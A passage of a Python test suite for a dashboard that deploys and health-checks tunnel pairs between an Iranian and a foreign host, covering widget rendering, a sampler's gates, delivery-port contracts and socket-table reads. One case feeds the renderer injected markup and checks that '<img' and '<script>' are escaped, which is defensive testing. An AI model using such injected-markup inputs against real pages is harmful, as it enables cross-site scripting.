                 {"p": short, "limit": 180, "now": t0 + 500},
                 {"p": dark, "limit": 180, "now": t0 + 620},
                 {"p": stale, "limit": 180, "now": t0 + 90000},
                 {"p": no_history, "limit": 180, "now": t0},
                 {"p": injected, "limit": 180, "now": t0 + 500},
                 {"p": {"foreign": {"verdict": "X", "samples": None, "burst_count": None,
                                    "interval_count": None, "totals": None, "baseline": None,
                                    "window": None, "skipped_counts": None, "bursts": None,
                                    "stale": None}},
                  "limit": None, "now": None}]

        base_src = self._js_source("function attributionHtml(a, staleAfterSec, nowSec) {")
        driver = self._capacity_js(base_src, entry="attributionHtml")

        def run(js_src, strict=True):
            path = os.path.join(tempfile.mkdtemp(), "attribution_widget.js")
            with open(path, "w", encoding="utf-8") as fh:
                fh.write(js_src)
            proc = subprocess.run([node, path, json.dumps(cases, ensure_ascii=False)],
                                  capture_output=True, encoding="utf-8", timeout=120)
            if proc.returncode != 0:
                self.assertFalse(strict, f"node failed: {proc.stderr[:600]}")
                return None
            return json.loads(proc.stdout)

        claims = [
            ("no history object is described as no history",
             lambda s: "تاریخچه‌ای برای انتساب نیست" in s[0]),
            ("an object with both roles but no samples still names both hosts",
             lambda s: "ایران" in s[1] and "خارج" in s[1]),
            ("the engine's token is printed verbatim next to the arithmetic it came from",
             lambda s: "BURSTS(1)" in s[2] and "280" in s[2] and "موج خروجی" in s[2]),
            ("the gauge that survives the burst is shown with the cause",
             lambda s: "SYN_RECV" in s[2] and "9" in s[2] and "vs own median" in s[2]),
            ("a calibrated host prints its own median, an uncalibrated one prints what is missing",
             lambda s: "میانهٔ نرخ" in s[2] and "میانهٔ نرخ" not in s[3]
                       and "لازم" in s[3] and str(engine.CONN_MIN_BASELINE_INTERVALS) in s[3]),
            ("an unusable interval count is said as unrecorded, never as a recorded zero",
             lambda s: "ثبت‌نشدن است" in s[4] and "مجموع:" not in s[4]
                       and "NO_USABLE_INTERVALS" in s[4]),
            ("and the refusal that produced it is named, by its engine name",
             lambda s: "host_unreachable=2" in s[4]
                       and all(k in s[4] for k in dark_all["foreign"]["skipped_counts"])
                       and "boot_between_samples" not in s[4]),
            ("a stale history says it describes the past, not the present",
             lambda s: "کهنه" in s[5] and "کهنه" not in s[2]),
            ("an empty history is not given a window",
             lambda s: "NO_HISTORY" in s[6] and "پنجرهٔ تاریخچه" not in s[6]),
            ("free text from the engine is escaped",
             lambda s: "<img" not in s[7] and "&lt;img" in s[7] and "<script>" not in s[7]),
            ("an unknown cause still gets the unattributed sentence",
             lambda s: "بی‌انتساب" in s[7]),
            ("a missing count prints as a dash, never as null and never as a recorded zero",
             lambda s: "null" not in s[8] and "— رگبار در —" in s[8] and "0 رگبار" not in s[8]),
            ("no case renders an address shape",
             lambda s: not re.findall(r"\b\d{1,3}(?:\.\d{1,3}){3}\b", "".join(s))),
        ]
        shown = run(driver)
        self.assertEqual(len(shown), len(cases))
        for why, ok in claims:
            self.assertTrue(ok(shown), f"the widget broke its own rule: {why}")

        mutations = [
            ("a null count rendered as 0", base_src.replace("? null : Number(x);", "? 0 : Number(x);")),
            ("the dash replaced by the raw value", base_src.replace("x === null ? '—' : String(x)", "String(x)")),
            ("the no-usable-interval branch suppressed, so zeros are printed",
             base_src.replace("if (!num(r.interval_count)) {", "if (false) {")),
            ("the uncalibrated host shown as if it had a baseline",
             base_src.replace("if (b.available) {", "if (true) {")),
            ("the bursts list dropped, so a burst is counted but never explained",
             base_src.replace("(r.bursts || []).forEach", "[].forEach")),
            ("the verdict paraphrased instead of quoted",
             base_src.replace("escapeHtml(verdict)", "'چیزی'")),
            ("the refusals hidden", base_src.replace("if (parts.length) {", "if (false) {")),
            ("the stale notice dropped", base_src.replace("if (r.stale) {", "if (false) {")),
            ("the cause label left unescaped", base_src.replace("escapeHtml(cause)", "x.cause")),
            ("a host with no attribution treated as a host with no traffic",
             base_src.replace("if (!a) {", "if (false) {")),
        ]
        for name, src in mutations:
            self.assertNotEqual(src, base_src, f"mutation {name!r} did not change the renderer")
            got = run(self._capacity_js(src, entry="attributionHtml"), strict=False)
            broken = (["the renderer could not produce output at all"] if got is None
                      else [why for why, ok in claims if not ok(got)])
            self.assertTrue(broken, f"mutation {name!r} passed every claim - the widget is not being "
                                    f"watched by this test")

    def test_105_the_capacity_sampler_only_starts_for_somebody_who_asked_for_it(self):
        """#70 Acceptance Test: the gates and the lifecycle of the one always-on path this round adds.

        This thread samples hosts every minute for the life of the dashboard process, so its two refusals
        matter more than its features: it must not start when the environment nobody set would make it a
        silent no-op, and it must not start when dry-run would make it record nothing while looking armed. A
        sampler that runs in name only is worse than no sampler, because the operator reading the panel
        during a reboot would believe the gap on screen is the gap in the network.
        """
        env_keys = (dashboard.CAPACITY_SAMPLER_ENV, dashboard.CAPACITY_INTERVAL_ENV)
        saved = {k: os.environ.get(k) for k in env_keys}

        def restore_env():
            for k in env_keys:
                os.environ.pop(k, None)
                if saved[k] is not None:
                    os.environ[k] = saved[k]
        for k in env_keys:
            os.environ.pop(k, None)
        self.addCleanup(restore_env)

        # ---- 1. The gate reads the environment, and reads it in one direction only.
        self.assertFalse(dashboard.capacity_sampling_enabled({}))
        for truthy in ("1", "true", "TRUE", "yes", "on", " On "):
            self.assertTrue(dashboard.capacity_sampling_enabled({dashboard.CAPACITY_SAMPLER_ENV: truthy}),
                            f"{truthy!r} should arm the sampler")
        for falsey in ("0", "no", "", "  ", "maybe"):
            self.assertFalse(dashboard.capacity_sampling_enabled({dashboard.CAPACITY_SAMPLER_ENV: falsey}),
                             f"{falsey!r} should not arm the sampler")

        # ---- 2. The period is clamped: a stampede and a typo are both refused.
        self.assertEqual(dashboard.capacity_interval_sec({}), dashboard.CAPACITY_DEFAULT_INTERVAL_SEC)
        self.assertEqual(dashboard.capacity_interval_sec({dashboard.CAPACITY_INTERVAL_ENV: "5"}), 15.0,
                         "a period below the floor was accepted, so the sampler would hammer both hosts")
        self.assertEqual(dashboard.capacity_interval_sec({dashboard.CAPACITY_INTERVAL_ENV: "99999"}), 3600.0)
        self.assertEqual(dashboard.capacity_interval_sec({dashboard.CAPACITY_INTERVAL_ENV: "90"}), 90.0)
        self.assertEqual(dashboard.capacity_interval_sec({dashboard.CAPACITY_INTERVAL_ENV: "5m"}),
                         dashboard.CAPACITY_DEFAULT_INTERVAL_SEC,
                         "a bad value took the dashboard down instead of falling back")

        # ---- 3. Dry run cannot arm a thread that would only ever refuse.
        dry = dashboard.CapacitySampler(pair_source=lambda: [], dry_run=lambda: True)
        with self.assertRaises(ValueError) as cm:
            dry.start()
        self.assertIn("BEST_TUNNEL_DRY_RUN", str(cm.exception))
        self.assertIsNone(dry._thread, "the refused sampler left a thread behind")
        self.assertEqual(dry.run_once()[0]["action"], "SKIP_DRY_RUN")

        live = dashboard.CapacitySampler(pair_source=lambda: [], interval_sec=3600.0,
                                         dry_run=lambda: False)
        try:
            self.assertTrue(live.start(), "a sampler that was asked to start did not start")
            self.assertFalse(live.start(), "a second start spawned a second sampler thread")
            self.assertTrue(live.status()["running"])
            self.assertEqual(live.status()["interval_sec"], 3600.0)
        finally:
            self.assertTrue(live.stop(timeout=5.0), "the sampler thread outlived stop()")
        self.assertFalse(live.status()["running"])
        self.assertTrue(live.stop(), "stopping a stopped sampler is not a success")

        # ---- 4. The audit trail holds transitions, not minutes.
        pid = storage.add_pair(name=f"samplerctl_{int(time.time() * 1000)}", iran_host="198.51.100.10",
                               foreign_host="203.0.113.20", frontend_port=443)
        self.addCleanup(storage.delete_pair, pid)
        opened = []
        cred = {"type": "password", "value": "fixture-placeholder-not-a-credential"}
        pair = {"id": pid, "status": "ACTIVE",
                "iran": {"host": "198.51.100.10", "auth": cred},
                "foreign": {"host": "203.0.113.20", "auth": cred}}

        def factory(spec, dry_run=True, host_role=""):
            opened.append(host_role)
            return RecordingRunner(host_role=host_role)

        state = {"boom": False}

        def recorder(p, ir, fr, dry_run=False, record=True, no_session_reasons=None):
            if state["boom"]:
                raise RuntimeError(f"session to {pair['foreign']} dropped")
            return {"recorded": 2, "ok": True, "summary": "2 hosts sampled"}

        real_factory = dashboard.get_ssh_runner
        before = sum(1 for a in storage.get_audit_logs(500)
                     if a["action"] == "CAPACITY_SAMPLER" and a["pair_id"] == pid)
        try:
            dashboard.get_ssh_runner = factory
            s = dashboard.CapacitySampler(pair_source=lambda: [pair], dry_run=lambda: False,
                                          recorder=recorder)
            for _ in range(3):
                self.assertEqual(s.run_once()[0]["action"], "SAMPLED")
            state["boom"] = True
            self.assertEqual(s.run_once()[0]["action"], "ERROR")
            state["boom"] = False
            self.assertEqual(s.run_once()[0]["action"], "SAMPLED")
            after = sum(1 for a in storage.get_audit_logs(500)
                        if a["action"] == "CAPACITY_SAMPLER" and a["pair_id"] == pid)
            self.assertEqual(after - before, 3,
                             f"five passes wrote {after - before} audit lines; the log is an operator trail, "
                             f"not a copy of the sampler's loop")
            self.assertEqual(len(opened), 10, "a pass opened something other than one session per host")
            statuses = [a["status"] for a in storage.get_audit_logs(500)
                        if a["action"] == "CAPACITY_SAMPLER" and a["pair_id"] == pid]
            self.assertEqual(sorted(set(statuses)), ["ERROR", "SAMPLED"], statuses)
            with self.subTest(control="the outage line is there to be found, and it names no address"):
                err = next(a for a in storage.get_audit_logs(500)
                           if a["action"] == "CAPACITY_SAMPLER" and a["pair_id"] == pid
                           and a["status"] == "ERROR")
                self.assertNotIn("203.0.113.20", err["details"],
                                 "the sampler's failure text reached the audit log unmasked (#28)")
                self.assertIn("ERROR", err["status"])
        finally:
            dashboard.get_ssh_runner = real_factory

        # ---- 5. The route keeps both gates, and says which one refused.
        real_sampler, real_dry = dashboard.CAPACITY_SAMPLER, dashboard.is_dry_run
        try:
            dashboard.CAPACITY_SAMPLER = None
            self._clear_mutation_bucket()
            out = self._post_api("/api/capacity_sampler", {"action": "start"})["body"]
            self.assertFalse(out["ok"], "the route armed a sampler nobody had set an environment for")
            self.assertIn(dashboard.CAPACITY_SAMPLER_ENV, out["error"])
            self.assertIn("action=once", out["error"],
                          "the refusal does not offer the operator the thing they can actually do")

            os.environ[dashboard.CAPACITY_SAMPLER_ENV] = "1"
            dashboard.is_dry_run = lambda: True
            out = self._post_api("/api/capacity_sampler", {"action": "start"})["body"]
            self.assertFalse(out["ok"], "the route started a thread that dry-run would refuse every pass")
            self.assertIn("BEST_TUNNEL_DRY_RUN", out["error"])

            self._clear_mutation_bucket()
            once = self._post_api("/api/capacity_sampler", {"action": "once"})["body"]
            self.assertTrue(once["ok"], "an explicit human request was refused by the automation gate")
            self.assertEqual(once["decisions"][0]["action"], "SKIP_DRY_RUN")
            self.assertTrue(once["dry_run"])

            self._clear_mutation_bucket()
            status = self._post_api("/api/capacity_sampler", {"action": "status"})["body"]
            self.assertTrue(status["ok"])
            self.assertFalse(status["sampler"]["running"], "a sampler that never started is reported running")

            self._clear_mutation_bucket()
            bogus = self._post_api("/api/capacity_sampler", {"action": "reboot"})["body"]
            self.assertFalse(bogus["ok"])
            self.assertIn("unknown sampler action", bogus["error"])
        finally:
            created = dashboard.CAPACITY_SAMPLER
            dashboard.CAPACITY_SAMPLER, dashboard.is_dry_run = real_sampler, real_dry
            if created is not None and created is not real_sampler:
                created.stop(timeout=5.0)
            if created is not None and created._thread is not None:
                self.assertFalse(created._thread.is_alive(),
                                 "a refused sampler left a live thread behind")


    # ---- round 064: the backend delivery contract (#63) --------------------------------------------
    IR_IP, FR_IP = "198.51.100.10", "203.0.113.20"

    def test_106_the_declared_delivery_port_reaches_the_artifact_of_every_declarable_transport(self):
        """#63 Acceptance Test: where a tunnel delivers is an input, and the emitted artifact carries it.

        The census that opened this item (`scratch/backend_contract_census_064.out`) measured 0/11
        generators that could be *told* a delivery port at all - the number was the frontend duplicated -
        so this is not a regression test for something that once worked. Each declarable transport is
        generated twice, once with no declaration and once with a port that is not the frontend, and the
        answer comes from `protocols.backend_target`, which re-reads the emitted file rather than the
        Python dict. A generator that accepted the kwarg and then ignored it passes a dict-level assert and
        fails here.
        """
        fe, be = 8898, 18080

        # ---- 0. Census: every generator is accounted for, or the contract has a hole in it.
        covered = set(protocols.BACKEND_TARGETS) | set(protocols.BACKEND_EGRESS_PROXIES)
        self.assertEqual(sorted(set(protocols.ALL_PROTOCOLS) - covered), [],
                         "a generator exists that the delivery contract says nothing about: it would be "
                         "deployed, verified and monitored as though its delivery end were unknown")

        for proto in protocols.BACKEND_PORT_DECLARABLE:
            plain = protocols.generate_deployment(proto, 10601, self.IR_IP, self.FR_IP, fe)
            info = protocols.backend_target(proto, plain)
            self.assertEqual(info["status"], "declared", f"{proto} with no declaration: {info}")
            self.assertEqual(info["port"], fe,
                             f"{proto}: undelivered declaration produced {info['port']}, not the frontend")
            self.assertEqual(info["lands_on"], "foreign", f"{proto}: {info}")

            told = protocols.generate_deployment(proto, 10601, self.IR_IP, self.FR_IP, fe,
                                                 backend_port=be)
            moved = protocols.backend_target(proto, told)
            self.assertEqual(moved["port"], be,
                             f"{proto} was told the delivery port is {be} and emitted {moved['port']} "
                             f"(source {moved['source']})")
            self.assertEqual(moved["status"], "declared", f"{proto}: {moved}")
            # The product names the delivery port and provisions no listener behind it. Asserting False
            # keeps the claim in the dashboard honest: `answered` is what something else put there.
            self.assertFalse(moved["provisions_backend"],
                             f"{proto} now claims to provision its own backend; the verification and the "
                             f"monitor's reading of `no-backend` both assume it does not")

        # ---- 1. A carrier's delivery is the DNAT/INPUT pair, and it still names a port.
        for carrier in protocols.INNER_PROBED:
            plan = protocols.generate_deployment(carrier, 10602, self.IR_IP, self.FR_IP, fe)
            info = protocols.backend_target(carrier, plan)
            self.assertEqual(info["status"], "declared", f"{carrier}: {info}")
            self.assertEqual(info["port"], fe, f"{carrier}: {info}")

        # ---- 2. The two egress proxies are classified by their text, not by membership.
        if protocols.is_singbox_enabled():
            for proto in protocols.BACKEND_EGRESS_PROXIES:
                info = protocols.backend_target(proto, protocols.generate_deployment(
                    proto, 10603, self.IR_IP, self.FR_IP, fe))
                self.assertEqual(info["status"], "egress-proxy", f"{proto}: {info}")
        else:
            print("    [test_106] sing-box quarantined: egress classification not exercised")

    def test_107_a_declaration_the_transport_cannot_honour_is_refused_instead_of_ignored(self):
        """#63 Acceptance Test: refusing is not the same as ignoring, and the difference is the product.

        A `backend_port` that a generator silently drops produces a healthy deploy delivering to the wrong
        port - which is the original defect. So the refusal has to arrive before anything is written, name
        the reason, and be a refusal for exactly the transports that cannot implement it.
        """
        fe, be = 8898, 18080

        for proto in protocols.BACKEND_PORT_DECLARABLE:
            self.assertEqual(protocols.backend_port_refusal(proto, fe, be), "",
                             f"{proto} is declarable and was refused")
        # Declaring the frontend is not a declaration at all: it is the number the tunnel already used, and
        # refusing it would make every pair that re-saves its form an error.
        for proto in protocols.ALL_PROTOCOLS:
            self.assertEqual(protocols.backend_port_refusal(proto, fe, fe), "",
                             f"{proto}: declaring the frontend must not be a refusal")
            for none in (None, "", 0):
                self.assertEqual(protocols.backend_port_refusal(proto, fe, none), "",
                                 f"{proto}: {none!r} means not declared")

        for proto in protocols.BACKEND_EGRESS_PROXIES:
            msg = protocols.backend_port_refusal(proto, fe, be)
            self.assertIn("no local delivery port", msg, f"{proto} was refused without a reason: {msg!r}")

        for proto in sorted(set(protocols.ALL_PROTOCOLS)
                            - set(protocols.BACKEND_PORT_DECLARABLE)
                            - set(protocols.BACKEND_EGRESS_PROXIES)):
            msg = protocols.backend_port_refusal(proto, fe, be)
            self.assertIn("cannot be given a separate backend port", msg, f"{proto}: {msg!r}")
            # The refusal names what the operator can do instead, or it is a dead end rather than a gate.
            self.assertIn("xray-reverse", msg)

        # And the refusal is enforced by the generator, not only offered by it.
        for proto in protocols.BACKEND_EGRESS_PROXIES + ("GRE", "ESP"):
            if proto not in protocols.get_supported_protocols():
                continue
            with self.assertRaises(ValueError) as ctx:
                protocols.generate_deployment(proto, 10701, self.IR_IP, self.FR_IP, fe,
                                              backend_port=be)
            self.assertIn(proto, str(ctx.exception))
            # The same call with no declaration still works: the refusal is about the declaration.
            protocols.generate_deployment(proto, 10701, self.IR_IP, self.FR_IP, fe)

    def test_108_the_deploy_refuses_a_delivery_end_it_cannot_name_or_that_contradicts_its_declaration(self):
        """#63 Acceptance Test: the read-back gate in front of the write.

        `undeclared-target` is the one failure the deploy cannot discover later - the tunnel comes up, the
        frontend binds, and the traffic goes nowhere - so a generator regression has to be refused rather
        than deployed and monitored. And a declaration the artifact contradicts is the second half: without
        the comparison, `backend_port` is a form field that changes nothing.
        """
        fe, be = 8898, 18080

        # ---- 1. An artifact that names no delivery port is refused before anything is touched.
        silent = {"foreign_files": {"chisel-server.json": '{"reverse": true, "port": "8898"}'},
                  "iran_files": {}, "iran_units": [], "foreign_units": []}
        blocked = engine.backend_target_block("chisel-wss", fe, None, silent)
        self.assertIn("emits no delivery port", blocked, blocked)

        # A matching declaration of the same artifact is refused for the same reason: the gate reads the
        # artifact, not the intent behind it.
        self.assertIn("emits no delivery port",
                      engine.backend_target_block("chisel-wss", fe, be, silent))

        # ---- 2. Declaration and artifact have to agree, and the message carries both numbers.
        told = protocols.generate_deployment("chisel-wss", 10801, self.IR_IP, self.FR_IP, fe,
                                             backend_port=be)
        self.assertEqual(engine.backend_target_block("chisel-wss", fe, be, told), "",
                         "a plan that honours its declaration was blocked - the gate would refuse every "
                         "correct deploy and read as a generator bug")

        def swap_ports(plan):
            out = dict(plan)
            for key in ("foreign_files", "iran_files"):
                out[key] = {name: text.replace(str(be), str(fe))
                            for name, text in (plan.get(key) or {}).items()}
            return out

        drifted = swap_ports(told)
        mismatch = engine.backend_target_block("chisel-wss", fe, be, drifted)
        self.assertIn("does not match its own declaration", mismatch, mismatch)
        self.assertIn(str(be), mismatch)
        self.assertIn(str(fe), mismatch)

        # ---- 3. An egress proxy is not an undeclared target.
        egress = {"foreign_files": {"config.json": '{"outbounds": [{"type": "direct", "tag": "direct"}]}'},
                  "iran_files": {}, "iran_units": [], "foreign_units": []}
        self.assertEqual(engine.backend_target_block("singbox-vless-reality", fe, None, egress), "",
                         "a transport with no local delivery was refused for having no local delivery")

    class _SsTable:
        """A runner whose `ss` answers are the exact transcripts `backend_listener_state` reads."""

        def __init__(self, full="", filtered=None, rc=0, second_rc=None, raise_on=None):
            self.full, self.filtered = full, (full if filtered is None else filtered)
            self.rc, self.second_rc, self.raise_on = rc, second_rc, raise_on
            self.calls = []

        def run(self, cmd, check=True, best_effort=False, timeout=30, retryable=False):
            self.calls.append(cmd)
            if self.raise_on and self.raise_on in cmd:
                raise ConnectionError("session dropped")
            filtered = "sport" in cmd
            if filtered:
                return (self.second_rc if self.second_rc is not None else self.rc), self.filtered, ""
            return self.rc, self.full, ""

    def test_109_the_delivery_port_is_read_by_two_independent_reads_that_can_each_fail(self):
        """#63 Acceptance Test: the instrument that replaced `ss … | grep -c ':PORT\\b' || true`.

        Six shapes, and the ones that matter are the failures: an `ss` that is missing, a table with no
        rows in it, a dropped session and two reads that disagree all have to come back `unreadable`,
        because any of them could otherwise be reported to an operator as "nothing listens there" - the
        discarded rc plus `2>/dev/null` fail-open this project already records as an invariant. A row for
        `:94430` is here for the substring lesson (#73): a matcher on the text counts a neighbour.
        """
        LISTEN_22 = "LISTEN 0 128 0.0.0.0:22 0.0.0.0:*\n"
        LISTEN_9443 = "LISTEN 0 65536 0.0.0.0:9443 0.0.0.0:*\n"
        NEIGHBOUR = "LISTEN 0 65536 0.0.0.0:94430 0.0.0.0:*\n"
        HEADER = "State  Recv-Q Send-Q Local Address:Port Peer Address:Port\n"

        # ---- 1. Answered, by both reads.
        st, why = engine.backend_listener_state(self._SsTable(LISTEN_22 + LISTEN_9443,
                                                               filtered=LISTEN_9443), 9443)
        self.assertEqual((st, why), ("answered", ""))

        # ---- 2. No backend: a readable table with a row that is not this port.
        st, _ = engine.backend_listener_state(self._SsTable(LISTEN_22, filtered=""), 9443)
        self.assertEqual(st, "no-backend")

        # ---- 3. The neighbour port is not a match, and is still a readable host.
        st, _ = engine.backend_listener_state(self._SsTable(LISTEN_22 + NEIGHBOUR, filtered=""), 9443)
        self.assertEqual(st, "no-backend", "the substring bug: :94430 answered for :9443")

        # ---- 4. `ss` missing (rc 127) is not "no backend".
        st, why = engine.backend_listener_state(self._SsTable("", rc=127), 9443)
        self.assertEqual(st, "unreadable", why)
        self.assertIn("rc=127", why)

        # ---- 5. A table with no LISTEN rows at all is a host this instrument cannot read.
        for empty in ("", HEADER, HEADER.strip() + "\n"):
            st, why = engine.backend_listener_state(self._SsTable(empty), 9443)
            self.assertEqual(st, "unreadable", f"empty transcript {empty!r} read as {st}: {why}")
            self.assertIn("cannot read this host", why)

        # ---- 6. A dropped session, and two reads that disagree.
        st, why = engine.backend_listener_state(self._SsTable(LISTEN_22, raise_on="sport"), 9443)
        self.assertEqual(st, "unreadable", why)
        self.assertIn("second read failed", why)
        st, why = engine.backend_listener_state(self._SsTable(LISTEN_22 + LISTEN_9443,
                                                              filtered=LISTEN_9443 + LISTEN_9443), 9443)
        self.assertEqual(st, "unreadable", why)
        self.assertIn("disagree", why)

        # The two reads are two commands, and neither is the fail-open shape that used to be here.
        seen = self._SsTable(LISTEN_22, filtered="")
        engine.backend_listener_state(seen, 9443)
        self.assertEqual(len(seen.calls), 2, seen.calls)
        for cmd in seen.calls:
            self.assertNotIn("|| true", cmd)
            self.assertNotIn("2>/dev/null", cmd)
            self.assertIn("ss -H -tln", cmd)

    def test_110_a_transport_with_nothing_behind_it_is_kept_and_labelled_not_rolled_back(self):
        """#63 Acceptance Test: the decision pair 2 was never allowed to make.

        Pair 2's chisel tunnel was up and delivered into 127.0.0.1:9443, where no process listened. The
        deploy read "no verified data flow" and rolled back, because the only outcome the code had for
        *front end bound, application absent* was failure. Three shapes now have three verdicts, and the
        middle one is the fix: a probe that gets bytes is `answered`; a bound frontend with both units
        active and two agreeing peer reads saying nothing listens there is KEPT and labelled
        TRANSPORT-ONLY; an unreadable read is still a rollback, because evidence that cannot be read does
        not certify a deployment either.

        `engine.MockSSHClient` is patched to an unrelated class for the duration of each deploy. That
        single `isinstance` is what lets a mock skip the verification window, so without the patch the
        decision under test is unreachable offline - and patching the name, rather than writing a third
        runner, keeps the transcript the shipped mock produces.
        """
        class _NotAMockRunner:
            """Sentinel whose only job is to make `isinstance(mock, engine.MockSSHClient)` false."""

        def deploy(listeners, probe_data, units_active=True, _n=[0]):
            _n[0] += 1
            name = f"backend-deploy-110-{_n[0]}"
            # `storage.add_pair` refuses a duplicate name, and these three shapes each need their own row.
            pid = storage.add_pair(name, self.IR_IP, self.FR_IP, 8898)
            self.addCleanup(self._forget_pair, pid)
            plan = protocols.generate_deployment("chisel-wss", pid, self.IR_IP, self.FR_IP, 8898,
                                                 backend_port=18080)
            ir_m, fr_m = RecordingRunner(host_role="iran"), RecordingRunner(host_role="foreign")
            # The keep-branch requires the units to be active; taking that from the plan the deploy itself
            # generates, so a unit rename cannot turn this test into a silent pass on a dead tunnel.
            for runner, units in ((ir_m, plan["iran_units"]), (fr_m, plan["foreign_units"])):
                for u in units:
                    runner.state["services"][u] = "active"
                # A unit that `enable --now` started and that died before the window read it: the mock
                # answers is-active from its table, and the flag below is what stops the start itself
                # from writing "active" there.
                if not units_active:
                    runner.state["units_die_after_start"] = True
                    runner.state["services"].clear()
            fr_m.state["listeners"] = dict(listeners)
            # The probe answers from its own flag, never from the listener table: the frontend is bound in
            # every one of these three cases, and a mock that derived the answer from it would test the
            # transport instead of the delivery end.
            ir_m.state["probe_data"] = probe_data
            original = engine.MockSSHClient
            engine.MockSSHClient = _NotAMockRunner
            try:
                res = engine.deploy_tunnel(
                    pair={"id": pid, "name": name, "frontend": 8898,
                          "frontend_port": 8898, "backend_port": 18080,
                          "iran": {"host": self.IR_IP, "port": 22},
                          "foreign": {"host": self.FR_IP, "port": 22}},
                    choice="chisel-wss", dry_run=False, force_confirmed=True,
                    verification_timeout=1.0, ir_runner=ir_m, fr_runner=fr_m)
            except RuntimeError as ex:
                engine.MockSSHClient = original
                return ex, pid, ir_m, fr_m
            engine.MockSSHClient = original
            return res, pid, ir_m, fr_m

        # ---- 1. Nothing behind the declared port, transport provably up: keep it, and say what it is.
        res, pid, _, fr1 = deploy({22: "sshd"}, False)
        self.assertIsInstance(res, dict, f"the keep-branch still raised: {res}")
        self.assertEqual(res["status"], "ACTIVE-TRANSPORT-ONLY-chisel-wss-8898", res)
        self.assertTrue(res["transport_only"])
        self.assertEqual(res["backend_state"], "no-backend")
        reads = [c for c in fr1.commands if "ss -H -tln" in c]
        self.assertEqual(len(reads), 2, f"a claim about a kernel socket table needs both reads: {reads}")
        self.assertIn("18080", reads[1], f"the filtered read asked about the frontend: {reads[1]}")
        self.assertFalse(any("8898" in c for c in reads),
                         f"the delivery read landed on the frontend port: {reads}")
        row = storage.get_pair(pid)
        self.assertEqual(row["backend_port"], 18080,
                         "the deploy stored the port it probed, not the frontend it bound")
        self.assertEqual(row["backend_state"], "no-backend")
        self.assertGreater(float(row["backend_checked_at"]), 0.0)

        # ---- 2. Bytes came back through the tunnel: an ordinary ACTIVE deploy, no transport-only label.
        res, _, _, _ = deploy({22: "sshd"}, True)
        self.assertEqual(res["status"], "ACTIVE-chisel-wss-8898", res)
        self.assertFalse(res["transport_only"])
        self.assertEqual(res["backend_state"], "answered")

        # ---- 3. A peer whose socket table this instrument cannot read is not a peer with no backend.
        err, pid3, _, _ = deploy({}, False)
        self.assertIsInstance(err, RuntimeError, f"an unreadable read was certified as a deployment: {err}")
        self.assertIn("backend:18080=unreadable", str(err), str(err))
        self.assertIn("Automatic rollback initiated", str(err))
        self.assertEqual(storage.get_pair(pid3)["backend_state"], "",
                         "a rolled-back deploy recorded a delivery state it never committed to")

        # ---- 4. The keep is earned by evidence, not by the branch existing: with the units down, the
        # same absent backend has to be a failure. Without this control the branch above would pass for a
        # deploy whose daemons never started.
        err, pid4, _, _ = deploy({22: "sshd"}, False, units_active=False)
        self.assertIsInstance(err, RuntimeError,
                              f"a dead tunnel was kept as transport-only: {err}")
        self.assertIn("inactive", str(err), str(err))
        self.assertEqual(storage.get_pair(pid4)["backend_state"], "")

        # ---- 5. The fail-open this replaced must not come back through the deploy path. Comments are
        # dropped first: this very function documents the removed `grep -c` in prose, and a seal that
        # matched prose would be a reason to delete the explanation rather than a control.
        def _sources(fn):
            return "\n".join(ln for ln in inspect.getsource(fn).splitlines()
                             if not ln.strip().startswith("#"))

        body = _sources(engine.deploy_tunnel)
        self.assertNotIn("|| true", body, "a discarded rc is back inside deploy_tunnel")
        self.assertNotIn("grep -c", body, "a port-count grep is back inside deploy_tunnel")
        # And the seal has to be able to fail: the same filter over a function that does discard an rc.
        self.assertIn("|| true", _sources(_seal_control_failopen),
                      "the comment filter hides real code, so the seal above measures nothing")

    def test_111_a_missing_application_makes_a_verdict_that_neither_heals_nor_looks_healthy(self):
        """#63 Acceptance Test: TRANSPORT-ONLY is a fourth status, and it has to behave in three places.

        Pair 2 spent a week scored as a 100%-loss outage while its transport was the only part that
        worked, because the L7 probe was measuring an application that was not there. The health checker
        now reads the declared delivery port on the peer, and the verdict has to travel: the monitor must
        neither call the pair HEALTHY nor arm a switchover, and `evaluate_and_heal` must refuse even for a
        caller that asks to heal degraded pairs - a successor would deliver into the same silence.

        The control that makes this a measurement rather than a reading of the source: with the *same*
        pair, the same 100% loss and a listener at the declared port, the verdict is DOWN, and with the
        declaration removed the read moves to the frontend - which is the port the pair does not use.
        """
        pid = storage.add_pair("backend-monitor-111", self.IR_IP, self.FR_IP, 8898)
        self.addCleanup(self._forget_pair, pid)
        plan = protocols.generate_deployment("chisel-wss", pid, self.IR_IP, self.FR_IP, 8898,
                                             backend_port=18080)

        def pair_spec(backend_port=18080):
            return {"id": pid, "name": "backend-monitor-111", "frontend": 8898, "frontend_port": 8898,
                    "backend_port": backend_port, "active_tunnel": "chisel-wss", "base_rtt_ms": 40.0,
                    "iran": {"host": self.IR_IP, "port": 22},
                    "foreign": {"host": self.FR_IP, "port": 22}}

        def check(backend_port=18080, listeners=(22,), dry_run=False):
            ir_m, fr_m = (mock_ssh.MockSSHClient(host_role="iran"),
                          mock_ssh.MockSSHClient(host_role="foreign"))
            for runner, units in ((ir_m, plan["iran_units"]), (fr_m, plan["foreign_units"])):
                for u in units:
                    runner.state["services"][u] = "active"
            # The transport is up by every instrument that can see it: both units, the frontend bound.
            ir_m.state["listeners"][8898] = "tunnel_client"
            ir_m.state["packet_loss"] = 100.0
            fr_m.state["listeners"] = {p: "sshd" for p in listeners}
            return failover.TunnelHealthChecker.check_health(
                ir_m, fr_m, pair_spec(backend_port), "chisel-wss", base_rtt=40.0, dry_run=dry_run)

        # ---- 1. The verdict itself, named after the thing that is missing.
        storage.set_pair_backend(pid, backend_port=18080)
        rep = check()
        self.assertEqual(rep.status, "TRANSPORT-ONLY", rep.details)
        self.assertEqual(rep.backend_state, "no-backend")
        self.assertTrue(rep.is_unit_active_iran and rep.is_unit_active_foreign and rep.is_socket_listening,
                        rep.details)
        self.assertIn("18080", rep.details, f"the operator has to be told which port was read: {rep.details}")

        # A health pass refreshes the read, never the declaration - the declaration is the operator's.
        row = storage.get_pair(pid)
        self.assertEqual(row["backend_state"], "no-backend")
        self.assertEqual(row["backend_port"], 18080)
        before = float(row["backend_checked_at"])

        # ---- 2. dry_run measures but does not write.
        storage.set_pair_backend(pid, backend_state="answered")
        rep_dry = check(dry_run=True)
        self.assertEqual(rep_dry.status, "TRANSPORT-ONLY", rep_dry.details)
        self.assertEqual(storage.get_pair(pid)["backend_state"], "answered",
                         "a dry-run pass rewrote a stored delivery state")

        # ---- 3. Controls: the verdict tracks the read, not the shape of the sample.
        answered = check(listeners=(22, 18080))
